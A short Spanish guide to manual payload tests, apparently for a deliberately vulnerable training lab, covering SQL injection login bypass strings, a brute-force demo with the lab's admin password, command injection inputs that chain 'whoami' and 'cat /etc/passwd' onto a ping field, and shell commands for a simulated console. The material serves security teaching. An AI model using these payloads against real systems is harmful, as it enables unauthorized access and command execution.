Guía de Payloads y Pruebas Manuales

1. Inyección SQL Manual (SQLi)

En el formulario de acceso, escribe manualmente en el campo Usuario:

admin' OR '1'='1
' OR 1=1 --
admin'--
Escribe cualquier texto en contraseña y pulsa "Iniciar Sesión". Entrarás directamente al Panel de Administración.

2. Ataque de Fuerza Bruta Manual

Para demostrar la fuerza bruta manual o cómo responde el servidor a intentos fallidos:

  • Usuario objetivo: admin
  • Contraseña real válida: dragon2024
  • Prueba ingresar contraseñas comunes (ej: 123456, admin, password). Cada intento manual aumentará el contador en el inspector y mostrará el código HTTP 401.

3. Inyección de Comandos Manual

En el diagnóstico de red (Ping), prueba escribir manualmente:

8.8.8.8; whoami
127.0.0.1 && cat /etc/passwd

4. Comandos de la Consola Web SSH

En la pestaña Consola Web SSH, puedes escribir con tu teclado:

  • help : Muestra los comandos disponibles.
  • whoami, id, uname -a, pwd
  • ls -la y cat flag.txt
  • ssh admin@127.0.0.1 : Inicia el flujo de autenticación SSH interactivo donde te pedirá la contraseña (usa dragon2024).
